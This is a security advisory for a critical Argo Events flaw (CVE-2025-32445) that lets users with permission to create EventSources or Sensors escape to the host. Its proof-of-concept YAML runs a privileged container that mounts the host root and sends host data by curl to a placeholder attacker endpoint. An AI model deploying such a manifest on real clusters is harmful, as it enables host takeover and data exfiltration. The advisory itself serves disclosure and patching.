# Argo Events users can gain privileged access to the host system and cluster with EventSource and Sensor CR 

**GHSA**: GHSA-hmp7-x699-cvhq | **CVE**: CVE-2025-32445 | **Severity**: critical (CVSS 10.0)

**CWE**: CWE-250, CWE-268

**Affected Packages**:
- **github.com/argoproj/argo-events** (go): < 1.9.6

## Description

### Summary:

A user with permission to create/modify EventSource and Sensor custom resources can gain privileged access to the host system and cluster, even without having direct administrative privileges.

### Details:

The `EventSource` and `Sensor` CRs allow the corresponding orchestrated pod to be customized with `spec.template` and `spec.template.container` (with type `k8s.io/api/core/v1.Container`), thus, any specification under `container` such as `command`, `args`, `securityContext `, `volumeMount` can be specified, and applied to the EventSource or Sensor pod due to the code logic below.

```golang
    if args.EventSource.Spec.Template != nil && args.EventSource.Spec.Template.Container != nil {
        if err := mergo.Merge(&eventSourceContainer, args.EventSource.Spec.Template.Container, mergo.WithOverride); err != nil {
            return nil, err
        }
    }
```

With these, A user would be able to gain privileged access to the cluster host, if he/she specified the EventSource/Sensor CR with some particular properties under `template`.

Here is an example that demonstrates the vulnerability.

```
apiVersion: argoproj.io/v1alpha1
kind: EventSource
metadata:
  name: poc-vulnerable-eventsource
spec:
  webhook:
    security-test:
      port: "12000"
      endpoint: "/webhook"
  template:
    container:
      image: ubuntu:latest
      command: ["/bin/bash"]
      args: [
        "-c",
        "apt-get update && apt-get install -y curl && while true; do
         rm -f /tmp/data;
         echo '=== containerd socket ===' > /tmp/data 2>&1;
         ls -la /host/run/containerd/containerd.sock >> /tmp/data 2>&1;
         echo '=== proof of host access ===' >> /tmp/data 2>&1;
         cat /host/etc/hostname >> /tmp/data 2>&1;
         curl -X POST --data-binary @/tmp/data http://<attacker-controlled-endpoint>:8000/;
         sleep 300;
         done"
      ]
      securityContext:
        privileged: true
        capabilities:
          add: ["SYS_ADMIN"]
      volumeMounts:
        - name: host-root
          mountPath: /host
    volumes:
      - name: host-root
        hostPath:
          path: /
```

### Impact:

- Multi-tenant Clusters:
  - Tenant isolation broken
  - Non-admin users can gain host/cluster access
  - Access to other tenants' data

- Security Model Bypass:
  - RBAC restrictions circumvented
  - Pod Security Policies/Standards bypassed
  - Host system compromised

### Patches

A [patch](https://github.com/argoproj/argo-events/pull/3528) for this vulnerability has been released in the following Argo Events version , which only limited properties under `spec.template.container` are allowed.

`v1.9.6`

### Credits

This vulnerability was found & reported by:

@thevilledev

The Argo team would like to thank him for his responsible disclosure and constructive communications during the resolve of this issue.
